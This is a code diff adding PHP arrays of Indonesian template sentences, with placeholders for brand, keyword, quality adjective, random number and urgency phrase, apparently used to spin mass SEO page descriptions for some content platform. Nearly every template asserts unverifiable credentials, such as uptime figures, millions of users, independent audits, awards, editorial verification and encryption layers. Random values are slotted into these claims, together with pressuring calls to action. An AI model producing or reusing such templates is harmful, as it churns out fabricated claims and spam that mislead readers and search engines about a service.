+    '{$KONEK2}, {$BRANDS} menjadi satu-satunya platform {$KUAL} yang {$V_SAJIKAN} konten {$W} {$E} terlengkap {$P_TENTANG} fenomena ini. Infrastruktur server tersebar di puluhan negara memastikan kecepatan akses {$W} {$E} optimal bagi seluruh pengguna di berbagai lokasi.',
+    '{$BRANDS} berkomitmen {$V_SAJIKAN} konten {$W} {$E} dengan standar {$KUAL} tertinggi di industri. {$KONEK2}, setiap artikel yang terbit telah melalui proses verifikasi multi-tahap oleh tim editorial berpengalaman demi akurasi informasi {$W} {$E}.',
+    '{$TAG} Platform {$BRANDS} dirancang {$KUAL} untuk pengalaman membaca konten {$W} {$E} tanpa gangguan. Teknologi enkripsi terdepan melindungi privasi setiap pengunjung yang {$V_AKSES} konten {$W} {$E} di ekosistem kami.',
+    '{$KONEK2}, {$BRANDS} terus berinovasi demi {$V_SAJIKAN} konten {$W} {$E} dengan kualitas {$KUAL} yang konsisten. Database kami diperbarui setiap hari dengan ribuan konten {$W} {$E} baru dari berbagai sumber terverifikasi.',
+    '{$BRANDS} {$V_SAJIKAN} pengalaman {$KUAL} dengan CDN global yang memastikan konten {$W} {$E} tersaji instan. {$KONEK2}, bandwidth unlimited kami menjamin streaming dan browsing {$W} {$E} tanpa throttling di jam sibuk sekalipun.',
+    '{$TAG} Keunggulan {$BRANDS} terletak pada kemampuan {$V_SAJIKAN} konten {$W} {$E} secara {$KUAL} dan real-time. AI moderasi canggih memfilter konten agar setiap halaman {$W} {$E} yang Anda akses berkualitas tinggi dan relevan.',
+    '{$KONEK2}, ribuan pengguna memilih {$BRANDS} {$P_SEBAGAI} sumber {$KUAL} konten {$W} {$E} harian mereka. Fitur bookmark dan notifikasi memudahkan Anda mengikuti perkembangan topik {$W} {$E} yang diminati secara personal.',
+    '{$BRANDS} {$V_SAJIKAN} konten {$W} {$E} dalam format multi-media: teks, audio, dan video {$KUAL}. {$KONEK2}, aksesibilitas menjadi prioritas agar semua kalangan bisa menikmati informasi {$W} {$E} tanpa hambatan apapun.',
+    '{$TAG} Server {$KUAL} {$BRANDS} beroperasi 24/7 dengan uptime 99.9% untuk akses konten {$W} {$E} tanpa putus. {$KONEK2}, tim teknis memantau performa platform secara real-time demi kenyamanan browsing {$W} {$E} Anda.',
+    '{$BRANDS} menerapkan standar {$KUAL} jurnalisme digital untuk setiap konten {$W} {$E} yang dipublikasikan. Proses editorial ketat dan transparansi sumber menjadi fondasi kepercayaan jutaan pembaca konten {$W} {$E} di platform kami.',
+    '{$KONEK2}, {$BRANDS} {$V_SAJIKAN} ekosistem konten {$W} {$E} {$KUAL} yang terintegrasi sempurna. Search engine internal memudahkan pencarian konten {$W} {$E} spesifik dari arsip kami yang sangat luas dan terus bertambah.',
+    '{$TAG} Algoritma rekomendasi {$BRANDS} memastikan Anda selalu mendapat konten {$W} {$E} paling relevan. {$KONEK2}, sistem {$KUAL} kami menyesuaikan tampilan berdasarkan preferensi unik setiap pengguna {$W} {$E}.',
+    '{$BRANDS} telah dipercaya jutaan pengguna {$P_SEBAGAI} destinasi {$KUAL} konten {$W} {$E} digital. Sertifikasi keamanan internasional memastikan setiap interaksi dengan platform {$W} {$E} kami terlindungi dan aman sepenuhnya.',
+    '{$KONEK2}, inovasi terbaru {$BRANDS} memungkinkan akses konten {$W} {$E} offline {$KUAL}. Smart download otomatis menyimpan konten {$W} {$E} terpopuler saat perangkat Anda terhubung WiFi untuk dibaca kapan saja dimanapun.',
+    '{$TAG} {$BRANDS} {$V_SAJIKAN} dashboard analitik {$KUAL} yang membantu Anda melacak tren konten {$W} {$E} terkini. Insight berbasis data memandu eksplorasi topik {$W} {$E} yang sedang ramai diperbincangkan di seluruh dunia.',
+    '{$BRANDS} mendukung sharing konten {$W} {$E} ke seluruh platform sosial media secara {$KUAL}. {$KONEK2}, fitur kolaborasi memungkinkan diskusi interaktif {$P_TENTANG} setiap konten {$W} {$E} yang Anda baca bersama komunitas.',
+    '{$KONEK2}, mode reader {$KUAL} di {$BRANDS} menghilangkan distraksi saat menikmati konten {$W} {$E} panjang. Typography yang dioptimalkan dan layout responsif menjadikan pengalaman membaca {$W} {$E} sangat nyaman di semua layar.',
+    '{$TAG} {$BRANDS} memiliki perpustakaan konten {$W} {$E} terbesar dengan koleksi {$KUAL} dari ratusan kontributor. Setiap konten {$W} {$E} dikategorikan rapi agar mudah ditemukan sesuai minat dan kebutuhan personal Anda.',
+    'Progressive web app {$BRANDS} memberikan pengalaman {$KUAL} native untuk konten {$W} {$E} langsung di browser. {$KONEK2}, tanpa perlu install aplikasi, Anda langsung bisa {$V_AKSES} seluruh fitur konten {$W} {$E} kami.',
+    '{$BRANDS} {$V_SAJIKAN} push notification {$KUAL} agar Anda tidak ketinggalan konten {$W} {$E} terbaru. {$KONEK2}, notifikasi cerdas hanya mengirim update {$W} {$E} yang sesuai dengan minat dan preferensi personal Anda.',
+    '{$TAG} Fitur multi-bahasa {$BRANDS} membuka akses konten {$W} {$E} {$KUAL} untuk audiens global. Auto-translate tersedia dalam puluhan bahasa agar konten {$W} {$E} bisa dinikmati tanpa batasan bahasa oleh siapapun.',
+    '{$KONEK2}, {$BRANDS} menyediakan API {$KUAL} untuk integrasi konten {$W} {$E} dengan platform lain secara seamless. Ekosistem terbuka ini memastikan konten {$W} {$E} kami dapat dijangkau dari berbagai titik akses digital.',
+    '{$BRANDS} menggunakan machine learning {$KUAL} untuk kurasi konten {$W} {$E} personal. {$KONEK2}, semakin sering Anda berinteraksi, semakin akurat rekomendasi konten {$W} {$E} yang disajikan khusus untuk Anda.',
+    '{$TAG} Geolocation feature {$BRANDS} membantu menemukan konten {$W} {$E} {$KUAL} berdasarkan lokasi Anda. {$KONEK2}, konten {$W} {$E} lokal dan global tersusun rapi untuk memudahkan navigasi pengguna dari manapun.',
+    '{$BRANDS} beroperasi dengan prinsip transparansi {$KUAL} dalam pengelolaan konten {$W} {$E}. {$KONEK2}, editorial board independen memastikan objektivitas dan akurasi setiap informasi {$W} {$E} yang kami terbitkan untuk publik.',
+    '{$KONEK2}, {$WAKTU} {$BRANDS} meluncurkan update {$EMOSI} dengan {$ANGKA} fitur baru {$KUAL} untuk konten {$W} {$E}. Performance meningkat drastis memastikan pengalaman browsing {$W} {$E} tercepat di kelasnya.',
+    '{$BRANDS} mencatat {$ANGKA} pengguna aktif {$WAKTU} yang menikmati konten {$W} {$E} {$KUAL} tanpa hambatan. {$KONEK2}, pencapaian {$EMOSI} ini membuktikan kepercayaan publik terhadap platform {$W} {$E} kami.',
+    '{$TAG} {$WAKTU}, {$BRANDS} meraih rating {$ANGKA} dari pengguna untuk layanan konten {$W} {$E} {$KUAL}. Pencapaian {$EMOSI} ini mendorong tim untuk terus berinovasi dalam {$V_SAJIKAN} konten {$W} {$E} terbaik.',
+    '{$KONEK2}, {$BRANDS} menyediakan {$ANGKA} kategori konten {$W} {$E} {$KUAL} yang diperbarui {$WAKTU}. Sistem {$EMOSI} ini memudahkan navigasi agar Anda menemukan konten {$W} {$E} sesuai minat dengan cepat.',
+    '{$BRANDS} memproses {$ANGKA} request per detik {$WAKTU} untuk konten {$W} {$E} {$KUAL} tanpa downtime. {$KONEK2}, kapasitas {$EMOSI} server kami menjamin akses {$W} {$E} stabil kapanpun Anda butuhkan.',
+    '{$TAG} Dengan {$ANGKA} mirror server, {$BRANDS} memastikan konten {$W} {$E} {$KUAL} tersedia {$WAKTU} dari lokasi terdekat. Kecepatan {$EMOSI} ini menjadikan pengalaman {$W} {$E} di {$BRANDS} tak tertandingi.',
+    '{$KONEK2}, {$BRANDS} telah mengoptimasi {$ANGKA} komponen {$KUAL} {$WAKTU} untuk performa konten {$W} {$E} maksimal. Hasil {$EMOSI} ini terasa langsung dalam kecepatan loading setiap halaman {$W} {$E}.',
+    '{$BRANDS} pride {$WAKTU}: {$ANGKA} penghargaan industri untuk layanan konten {$W} {$E} {$KUAL}. {$KONEK2}, pengakuan {$EMOSI} ini memperkuat komitmen kami dalam {$V_SAJIKAN} konten {$W} {$E} tanpa kompromi.',
+    '{$TAG} {$WAKTU} {$BRANDS} mencapai milestone {$EMOSI}: {$ANGKA} konten {$W} {$E} {$KUAL} tersedia dalam arsip digital. Volume ini menjadikan {$BRANDS} perpustakaan konten {$W} {$E} terbesar di kategorinya.',
+    '{$KONEK2}, security audit {$WAKTU} mengonfirmasi {$BRANDS} memenuhi {$ANGKA} standar keamanan {$KUAL} untuk konten {$W} {$E}. Perlindungan {$EMOSI} ini membuat setiap pengguna {$W} {$E} merasa aman berselancar.',
+    '{$BRANDS} mengalokasikan {$ANGKA} sumber daya {$WAKTU} untuk R&D konten {$W} {$E} {$KUAL}. {$KONEK2}, investasi {$EMOSI} ini menghasilkan fitur-fitur inovatif yang terus memperkaya pengalaman {$W} {$E}.',
+    '{$TAG} Benchmark {$WAKTU}: {$BRANDS} unggul di {$ANGKA} metrik kinerja untuk platform konten {$W} {$E} {$KUAL}. Keunggulan {$EMOSI} ini diverifikasi oleh lembaga testing independen terkemuka.',
+    '{$KONEK2}, {$WAKTU} tim {$BRANDS} berhasil mereduksi latency sebesar {$ANGKA} untuk konten {$W} {$E} {$KUAL}. Peningkatan {$EMOSI} ini langsung terasa dalam responsivitas setiap interaksi pengguna {$W} {$E}.',
+    '{$BRANDS} memperluas jangkauan ke {$ANGKA} region baru {$WAKTU} untuk distribusi konten {$W} {$E} {$KUAL}. {$KONEK2}, ekspansi {$EMOSI} ini memastikan lebih banyak pengguna menikmati konten {$W} {$E} kami.',
+    '{$TAG} {$BRANDS} memperkenalkan {$ANGKA} tool kreator {$WAKTU} untuk ekosistem konten {$W} {$E} {$KUAL}. Inovasi {$EMOSI} ini memberdayakan kontributor menghasilkan konten {$W} {$E} berkualitas lebih tinggi.',
+    '{$KONEK2}, {$WAKTU} uptime {$BRANDS} mencapai {$ANGKA} untuk layanan konten {$W} {$E} {$KUAL}. Reliabilitas {$EMOSI} ini menjamin akses tanpa gangguan ke seluruh koleksi konten {$W} {$E} kami.',
+    '{$BRANDS} menerapkan {$ANGKA} layer enkripsi {$WAKTU} untuk proteksi konten {$W} {$E} {$KUAL}. {$KONEK2}, keamanan {$EMOSI} ini melindungi privasi dan data setiap pengunjung konten {$W} {$E}.',
+    '{$TAG} Community {$BRANDS} {$WAKTU} tumbuh {$ANGKA} dengan konten {$W} {$E} {$KUAL} sebagai daya tarik utama. Pertumbuhan {$EMOSI} ini mencerminkan kepuasan pengguna terhadap ekosistem konten {$W} {$E}.',
+    '{$KONEK2}, {$BRANDS} merilis {$ANGKA} update {$KUAL} {$WAKTU} untuk peningkatan konten {$W} {$E} berkelanjutan. Komitmen {$EMOSI} pada perbaikan terus-menerus menjadikan {$BRANDS} pilihan utama konten {$W} {$E}.',
+    '{$BRANDS} {$WAKTU} mencapai {$ANGKA} daily active users yang mengakses konten {$W} {$E} {$KUAL}. {$KONEK2}, angka {$EMOSI} ini membuktikan {$BRANDS} sebagai platform konten {$W} {$E} terdepan.',
+    '{$TAG} Trust score {$BRANDS} {$WAKTU}: {$ANGKA} dari lembaga rating independen untuk konten {$W} {$E} {$KUAL}. Skor {$EMOSI} ini menempatkan {$BRANDS} di peringkat teratas platform konten {$W} {$E}.',
+    '{$KONEK2}, {$BRANDS} mengoperasikan {$ANGKA} data center {$KUAL} {$WAKTU} untuk distribusi konten {$W} {$E} global. Infrastruktur {$EMOSI} ini memastikan konten {$W} {$E} dimuat instan dari manapun.',
+    '{$BRANDS} menyediakan {$ANGKA} template personalisasi {$WAKTU} untuk tampilan konten {$W} {$E} {$KUAL}. {$KONEK2}, kustomisasi {$EMOSI} ini memungkinkan setiap pengguna menikmati konten {$W} {$E} sesuai selera.',
+    '{$TAG} {$WAKTU}, {$BRANDS} memproses {$ANGKA} konten {$W} {$E} baru setiap jam dengan standar {$KUAL}. Produktivitas {$EMOSI} tim editorial memastikan Anda selalu mendapat konten {$W} {$E} terkini.',
+);
+
+// P4: Features — Fitur teknis platform (~40-50 kata)
+$p['desc_p4'] = array(
+    '{$V_AKSES} fitur {$KUAL} {$BRANDS} {$P_TENTANG} konten {$W} {$E} dengan teknologi adaptive bitrate yang menyesuaikan kualitas streaming otomatis. {$KONEK}, fitur picture-in-picture memungkinkan Anda menikmati konten {$W} {$E} sambil melakukan aktivitas lain.',
+    '{$TAG} {$BRANDS} menyediakan subtitle multi-bahasa {$KUAL} untuk konten {$W} {$E} dalam format video dan audio. Fitur smart chapter membagi konten {$W} {$E} menjadi segmen-segmen navigasi yang memudahkan pencarian bagian spesifik.',
+    '{$KONEK}, arsitektur {$KUAL} {$BRANDS} mendukung streaming konten {$W} {$E} di semua perangkat sekaligus. Sinkronisasi progress otomatis memastikan Anda bisa melanjutkan konten {$W} {$E} dari titik terakhir di device berbeda.',
+    '{$V_AKSES} mode teater {$KUAL} {$BRANDS} untuk pengalaman konten {$W} {$E} layar penuh tanpa distraksi. {$TAG} Adaptive display mengoptimalkan tampilan konten {$W} {$E} sesuai resolusi dan aspect ratio setiap perangkat Anda.',
+    '{$TAG} {$BRANDS} menyematkan fitur loop dan slow-motion {$KUAL} untuk analisis konten {$W} {$E} lebih mendalam. Speed control memungkinkan Anda mengatur kecepatan konsumsi konten {$W} {$E} sesuai preferensi personal Anda.',
+    '{$KONEK}, fitur casting {$KUAL} {$BRANDS} mendukung Chromecast dan smart TV untuk konten {$W} {$E} di layar besar. Konektivitas seamless memastikan transisi konten {$W} {$E} dari mobile ke TV tanpa gangguan.',
+    '{$V_AKSES} content hub {$KUAL} {$BRANDS} yang mengorganisir seluruh konten {$W} {$E} dalam kategori rapi dan terstruktur. {$TAG} Filter canggih membantu menemukan konten {$W} {$E} spesifik berdasarkan tema tanggal dan relevansi.',
+    '{$TAG} {$BRANDS} mengintegrasikan AI editor {$KUAL} yang otomatis membuat highlight konten {$W} {$E} paling menarik. Scene detection technology menandai momen-momen kunci di setiap konten {$W} {$E} untuk navigasi cepat.',
+    '{$KONEK}, {$BRANDS} menawarkan dual-audio {$KUAL} dengan pilihan dubbing untuk konten {$W} {$E} internasional. Language switch instan memungkinkan pergantian bahasa konten {$W} {$E} tanpa harus me-reload halaman.',
+    '{$V_AKSES} fitur social viewing {$KUAL} {$BRANDS} untuk menikmati konten {$W} {$E} bersama teman secara virtual. {$TAG} Watch party dengan chat real-time membuat pengalaman konten {$W} {$E} lebih interaktif dan menyenangkan.',
+    '{$TAG} {$BRANDS} menyediakan playlist generator {$KUAL} berbasis AI untuk konten {$W} {$E} yang disesuaikan mood. Autoplay cerdas menyusun antrian konten {$W} {$E} berdasarkan riwayat dan preferensi unik Anda.',
+    '{$KONEK}, fitur offline download {$KUAL} {$BRANDS} memungkinkan penyimpanan konten {$W} {$E} untuk ditonton tanpa internet. Smart storage management mengoptimalkan ruang penyimpanan konten {$W} {$E} di perangkat Anda secara efisien.',
+    '{$V_AKSES} analitik personal {$KUAL} {$BRANDS} yang menampilkan statistik konsumsi konten {$W} {$E} Anda. {$TAG} Insight mingguan memberikan rekomendasi tema konten {$W} {$E} baru berdasarkan pola kebiasaan Anda.',
+    '{$TAG} Edge computing {$KUAL} {$BRANDS} memastikan konten {$W} {$E} dimuat dari server terdekat dengan lokasi Anda. {$KONEK}, latensi ultra-rendah membuat pengalaman browsing konten {$W} {$E} terasa instan dan responsif.',
+    '{$KONEK}, {$BRANDS} mendukung format konten {$W} {$E} {$KUAL} mulai dari artikel teks hingga podcast dan video interaktif. Satu akun membuka akses ke seluruh format konten {$W} {$E} tanpa biaya tambahan apapun.',
+    '{$V_AKSES} fitur anotasi {$KUAL} {$BRANDS} untuk menandai bagian penting konten {$W} {$E} dan membuat catatan pribadi. {$TAG} Highlight yang tersimpan di cloud bisa diakses dari perangkat manapun kapan saja.',
+    '{$TAG} {$BRANDS} memiliki sistem rekomendasi kolaboratif {$KUAL} untuk konten {$W} {$E} berbasis komunitas. Pengguna dengan minat serupa saling berbagi temuan konten {$W} {$E} terbaik melalui fitur kurasi sosial.',
+    '{$KONEK}, {$BRANDS} menyediakan dark mode {$KUAL} dan pengaturan font untuk kenyamanan membaca konten {$W} {$E}. Personalisasi tampilan memastikan pengalaman konten {$W} {$E} optimal di segala kondisi pencahayaan.',
+    '{$V_AKSES} notifikasi breaking news {$KUAL} dari {$BRANDS} untuk update konten {$W} {$E} terpenting secara real-time. {$TAG} Priority alerts memastikan Anda selalu jadi yang pertama mengetahui konten {$W} {$E} trending.',
+    '{$TAG} {$BRANDS} mengimplementasikan progressive loading {$KUAL} untuk konten {$W} {$E} berat agar tetap cepat. Lazy loading images dan optimasi bandwidth memastikan halaman konten {$W} {$E} dimuat secara efisien.',
+    '{$KONEK}, fitur recap {$KUAL} {$BRANDS} meringkas konten {$W} {$E} panjang menjadi poin-poin kunci dalam hitungan detik. AI summarizer mengekstrak informasi {$W} {$E} terpenting tanpa mengorbankan konteks utama.',
+    '{$V_AKSES} wish list {$KUAL} {$BRANDS} untuk menyimpan konten {$W} {$E} yang ingin dibaca nanti. {$TAG} Read-later queue terintegrasi dengan kalender untuk mengingatkan jadwal konsumsi konten {$W} {$E} Anda.',
+    '{$TAG} {$BRANDS} menyediakan text-to-speech {$KUAL} untuk mendengarkan konten {$W} {$E} artikel sebagai audio. Suara natural AI membuat pengalaman mendengarkan konten {$W} {$E} nyaman tanpa harus membaca layar.',
+    '{$KONEK}, {$BRANDS} mendukung keyboard shortcut {$KUAL} untuk navigasi konten {$W} {$E} super cepat di desktop. Power user bisa menjelajahi konten {$W} {$E} lebih efisien dengan gesture dan hotkey yang intuitif.',
+    '{$V_AKSES} timeline interaktif {$KUAL} {$BRANDS} yang memvisualisasikan perkembangan setiap topik konten {$W} {$E}. {$TAG} Data-driven storytelling menyajikan konten {$W} {$E} dalam konteks temporal yang mudah dipahami.',
+    '{$V_AKSES} fitur {$EMOSI} terbaru {$BRANDS} {$WAKTU}: {$ANGKA} tools {$KUAL} untuk eksplorasi konten {$W} {$E} lebih mendalam. Smart filter menyaring konten {$W} {$E} berdasarkan preferensi unik setiap pengguna.',
+    '{$TAG} {$BRANDS} {$WAKTU} mengintegrasikan {$ANGKA} API {$KUAL} baru yang membuat akses konten {$W} {$E} makin {$EMOSI}. {$KONEK}, konektivitas lintas platform memastikan konten {$W} {$E} tersinkronisasi sempurna.',
+    '{$KONEK}, {$BRANDS} menghadirkan {$ANGKA} format konten {$W} {$E} {$KUAL} baru {$WAKTU} dengan pengalaman {$EMOSI}. Dari artikel hingga podcast, setiap format konten {$W} {$E} dioptimasi untuk engagement maksimal.',
+    '{$V_AKSES} dashboard {$EMOSI} {$BRANDS} {$WAKTU}: pantau {$ANGKA} metrik real-time tentang konten {$W} {$E} {$KUAL} favorit Anda. Insight actionable membantu Anda menavigasi ekosistem konten {$W} {$E} efisien.',
+    '{$TAG} {$BRANDS} merilis engine pencarian {$KUAL} ver. {$ANGKA} {$WAKTU} untuk konten {$W} {$E} yang lebih {$EMOSI}. Semantic search memahami intent Anda dan menampilkan konten {$W} {$E} paling relevan.',
+    '{$KONEK}, {$WAKTU} {$BRANDS} menambahkan {$ANGKA} widget interaktif {$KUAL} untuk halaman konten {$W} {$E}. Pengalaman {$EMOSI} ini mengubah cara Anda berinteraksi dengan setiap konten {$W} {$E} secara fundamental.',
+    '{$V_AKSES} collaboration suite {$KUAL} {$BRANDS} {$WAKTU}: {$ANGKA} fitur sharing membuat diskusi konten {$W} {$E} makin {$EMOSI}. Co-reading dan annotation bersama memperkaya pemahaman konten {$W} {$E}.',
+    '{$TAG} {$BRANDS} mengimplementasi {$ANGKA} modul keamanan {$KUAL} {$WAKTU} untuk proteksi konten {$W} {$E} tingkat {$EMOSI}. Zero-knowledge encryption melindungi aktivitas browsing konten {$W} {$E} Anda.',
+    '{$KONEK}, content delivery {$KUAL} {$BRANDS} {$WAKTU} diperkuat {$ANGKA} edge node baru untuk konten {$W} {$E} yang {$EMOSI}. Distribusi konten {$W} {$E} global kini lebih cepat dari sebelumnya.',
+    '{$V_AKSES} creator studio {$KUAL} {$BRANDS} {$WAKTU}: {$ANGKA} tool produksi untuk konten {$W} {$E} berkualitas {$EMOSI}. {$TAG} Ekosistem kreator memastikan pasokan konten {$W} {$E} segar setiap hari.',
+    '{$TAG} {$BRANDS} auto-translate {$WAKTU} mendukung {$ANGKA} bahasa {$KUAL} untuk konten {$W} {$E}. Fitur {$EMOSI} ini menghapus barrier bahasa agar semua orang menikmati konten {$W} {$E} tanpa batas.',
+    '{$KONEK}, {$BRANDS} {$WAKTU} memperkenalkan {$ANGKA} tema tampilan {$KUAL} baru untuk halaman konten {$W} {$E}. Estetika {$EMOSI} ini meningkatkan kenyamanan visual saat menikmati konten {$W} {$E}.',
+    '{$V_AKSES} {$BRANDS} mobile app {$KUAL} versi {$ANGKA} {$WAKTU} untuk konten {$W} {$E} on-the-go yang {$EMOSI}. {$TAG} Optimasi baterai memungkinkan marathon konten {$W} {$E} berjam-jam tanpa khawatir.',
+    '{$TAG} {$BRANDS} {$WAKTU} menghadirkan {$ANGKA} channel kurasi {$KUAL} spesifik untuk konten {$W} {$E}. Pengalaman {$EMOSI} terpersonalisasi memastikan Anda selalu menemukan konten {$W} {$E} yang tepat.',
+    '{$KONEK}, analytics {$KUAL} {$BRANDS} {$WAKTU} menunjukkan {$ANGKA} pola konsumsi konten {$W} {$E} yang {$EMOSI}. Data ini membantu platform menyesuaikan rekomendasi konten {$W} {$E} dengan presisi tinggi.',
+    '{$V_AKSES} smart playlist {$KUAL} {$BRANDS} {$WAKTU}: {$ANGKA} kombinasi konten {$W} {$E} yang dikurasi secara {$EMOSI}. AI curator menyusun urutan konten {$W} {$E} optimal berdasarkan mood Anda.',
+    '{$TAG} {$BRANDS} QoS {$WAKTU}: {$ANGKA} SLA {$KUAL} dipenuhi untuk layanan konten {$W} {$E} tanpa kompromi. Konsistensi {$EMOSI} ini yang membedakan {$BRANDS} dari platform konten {$W} {$E} lainnya.',
+    '{$KONEK}, {$BRANDS} {$WAKTU} meluncurkan {$ANGKA} fitur aksesibilitas {$KUAL} untuk konten {$W} {$E} inklusif. Inovasi {$EMOSI} ini memastikan semua kalangan menikmati konten {$W} {$E} tanpa hambatan.',
+    '{$V_AKSES} micro-learning module {$KUAL} {$BRANDS} {$WAKTU}: {$ANGKA} topik konten {$W} {$E} dalam format ringkas {$EMOSI}. {$TAG} Bite-sized content {$W} {$E} cocok untuk konsumsi di sela kesibukan.',
+    '{$TAG} {$BRANDS} {$WAKTU} mencapai {$ANGKA} mitra distribusi {$KUAL} untuk konten {$W} {$E} terluas. Jangkauan {$EMOSI} ini memastikan konten {$W} {$E} tersedia di setiap kanal digital utama.',
+    '{$KONEK}, {$BRANDS} community hub {$KUAL} {$WAKTU} menghubungkan {$ANGKA} penggemar konten {$W} {$E}. Interaksi {$EMOSI} antar pengguna memperkaya pengalaman konsumsi konten {$W} {$E} secara kolektif.',
+    '{$V_AKSES} {$BRANDS} notification center {$KUAL} {$WAKTU}: {$ANGKA} alert cerdas untuk konten {$W} {$E} yang {$EMOSI}. Prioritas notifikasi memastikan Anda tak melewatkan konten {$W} {$E} terpenting.',
+    '{$TAG} {$BRANDS} CDN {$WAKTU} diperluas ke {$ANGKA} titik distribusi {$KUAL} baru untuk konten {$W} {$E}. Kecepatan {$EMOSI} ini membuat loading konten {$W} {$E} terasa instan di seluruh dunia.',
+    '{$KONEK}, {$BRANDS} archive system {$KUAL} {$WAKTU} menyimpan {$ANGKA} konten {$W} {$E} historis untuk referensi lengkap. Kelengkapan {$EMOSI} arsip memastikan tidak ada konten {$W} {$E} berharga yang hilang.',
+);
+
+// P5: CTA Closing — Call to action & penutup (~40-50 kata)
+$p['desc_p5'] = array(
+    '{$CTA} — {$BRANDS} {$V_SAJIKAN} semua yang Anda butuhkan {$P_TENTANG} konten {$W} {$E} {$KUAL} dalam satu platform terintegrasi. {$URGENCY} {$AUDIENCE} — bergabunglah sekarang dan rasakan pengalaman {$W} {$E} terbaik bersama jutaan pengguna {$BRANDS}.',
+    '{$KONEK2}, {$V_AKSES} seluruh koleksi konten {$W} {$E} {$KUAL} di {$BRANDS} tanpa batasan apapun. {$CTA} {$URGENCY}! {$AUDIENCE} — jadikan {$BRANDS} sumber utama informasi {$W} {$E} harian Anda mulai detik ini.',
+    '{$TAG} {$CTA} {$V_AKSES} {$BRANDS} sekarang untuk mendapatkan konten {$W} {$E} {$KUAL} yang tidak tersedia di tempat lain. {$URGENCY} — {$AUDIENCE} sudah membuktikan bahwa {$BRANDS} adalah destinasi {$W} {$E} terdepan.',
+    '{$BRANDS} menanti Anda untuk {$V_AKSES} konten {$W} {$E} {$KUAL} selengkapnya. {$CTA} — {$KONEK2}, {$URGENCY}! Ribuan {$AUDIENCE} telah menikmati pengalaman {$W} {$E} tak tertandingi di {$BRANDS} setiap harinya.',
+    '{$V_AKSES} {$BRANDS} sekarang dan {$V_LIHAT} sendiri mengapa platform ini menjadi pilihan {$KUAL} untuk konten {$W} {$E}. {$TAG} {$CTA} {$URGENCY}! {$AUDIENCE} — langkah Anda berikutnya dimulai di sini.',
+    '{$KONEK2}, tidak ada alasan untuk menunda. {$CTA} {$V_AKSES} {$BRANDS} dan nikmati konten {$W} {$E} {$KUAL} sepuasnya tanpa hambatan. {$URGENCY} {$AUDIENCE} — jadilah bagian dari komunitas terdepan {$BRANDS}.',
+    '{$TAG} {$BRANDS} siap {$V_SAJIKAN} pengalaman konten {$W} {$E} {$KUAL} terbaik untuk Anda. {$CTA} — {$URGENCY}! {$AUDIENCE} dari seluruh dunia telah memberikan rating tertinggi pada platform {$W} {$E} kami.',
+    '{$CTA} {$V_AKSES} {$BRANDS} dan buktikan sendiri kualitas {$KUAL} konten {$W} {$E} yang kami sajikan. {$KONEK2}, {$URGENCY}! {$AUDIENCE} — {$BRANDS} adalah jawaban untuk kebutuhan informasi {$W} {$E} Anda.',
+    '{$V_AKSES} konten {$W} {$E} {$KUAL} di {$BRANDS} tanpa registrasi rumit dan tanpa hambatan apapun. {$TAG} {$CTA} — {$URGENCY}! Bergabung dengan {$AUDIENCE} yang telah merasakan manfaat platform {$W} {$E} terlengkap ini.',
+    '{$TAG} {$CTA} — {$BRANDS} {$V_SAJIKAN} akses {$KUAL} ke konten {$W} {$E} yang Anda cari. {$KONEK2}, {$URGENCY}! {$AUDIENCE} memilih {$BRANDS} karena konsistensi dan keandalan platform {$W} {$E} kami.',
+    '{$BRANDS} komitmen pada kualitas {$KUAL} menjadikan konten {$W} {$E} di platform ini berbeda dari yang lain. {$CTA} {$URGENCY} — {$AUDIENCE} sudah merasakan perbedaannya. {$V_AKSES} sekarang juga.',
+    '{$KONEK2}, {$CTA} {$V_AKSES} layanan {$KUAL} {$BRANDS} untuk konten {$W} {$E} tanpa batas. {$TAG} {$URGENCY}! {$AUDIENCE} — nikmati semua fitur premium {$W} {$E} yang {$BRANDS} sediakan khusus untuk Anda.',
+    '{$V_AKSES} {$BRANDS} hari ini dan temukan konten {$W} {$E} {$KUAL} yang mengubah cara Anda mendapatkan informasi. {$CTA} — {$URGENCY}! {$AUDIENCE} telah membuktikan transformasi digital bersama {$BRANDS}.',
+    '{$TAG} {$BRANDS} terus berkembang demi {$V_SAJIKAN} konten {$W} {$E} {$KUAL} terbaik kepada Anda. {$CTA} {$KONEK2}, {$URGENCY}! {$AUDIENCE} — jangan tertinggal dari tren informasi {$W} {$E} terkini.',
+    '{$CTA} — {$V_AKSES} ekosistem konten {$W} {$E} {$KUAL} di {$BRANDS} dan rasakan perbedaannya langsung. {$URGENCY}! {$TAG} {$AUDIENCE} menjadikan {$BRANDS} rumah digital kedua mereka untuk konten {$W} {$E}.',
+    '{$KONEK2}, {$BRANDS} adalah pilihan {$KUAL} tepat untuk setiap kebutuhan konten {$W} {$E} Anda. {$CTA} {$URGENCY} — {$AUDIENCE} sudah bergabung. {$V_AKSES} sekarang sebelum Anda ketinggalan informasi {$W} {$E} penting.',
+    '{$TAG} {$V_AKSES} {$BRANDS} dan mulai petualangan konten {$W} {$E} {$KUAL} Anda sekarang juga. {$CTA} — {$URGENCY}! {$AUDIENCE} dari berbagai kalangan telah menemukan rumah informasi {$W} {$E} terbaik di {$BRANDS}.',
+    '{$BRANDS} {$V_SAJIKAN} garansi kepuasan untuk setiap pengguna konten {$W} {$E} {$KUAL} di platform kami. {$CTA} {$KONEK2}, {$URGENCY}! {$AUDIENCE} — pengalaman {$W} {$E} terbaik menanti Anda di {$BRANDS}.',
+    '{$CTA} {$V_AKSES} {$BRANDS} dan jadilah bagian dari revolusi konten {$W} {$E} {$KUAL} digital. {$TAG} {$URGENCY}! {$AUDIENCE} — bersama {$BRANDS} akses informasi {$W} {$E} menjadi lebih mudah dari sebelumnya.',
+    '{$TAG} {$KONEK2}, {$BRANDS} menunggu Anda untuk {$V_AKSES} konten {$W} {$E} {$KUAL} selengkapnya. {$CTA} {$URGENCY}! {$AUDIENCE} — satu langkah lagi menuju pengalaman {$W} {$E} premium di {$BRANDS}.',
+    '{$V_AKSES} {$BRANDS} sekarang untuk konten {$W} {$E} {$KUAL} tanpa kompromi kualitas dan tanpa batasan. {$CTA} — {$URGENCY}! {$TAG} {$AUDIENCE} telah menikmati jutaan konten {$W} {$E} yang tersedia di {$BRANDS}.',
+    '{$BRANDS} berdedikasi {$V_SAJIKAN} konten {$W} {$E} {$KUAL} yang informatif dan menghibur. {$KONEK2}, {$CTA} {$URGENCY}! {$AUDIENCE} — {$V_AKSES} dan rasakan standar tertinggi konten {$W} {$E} digital.',
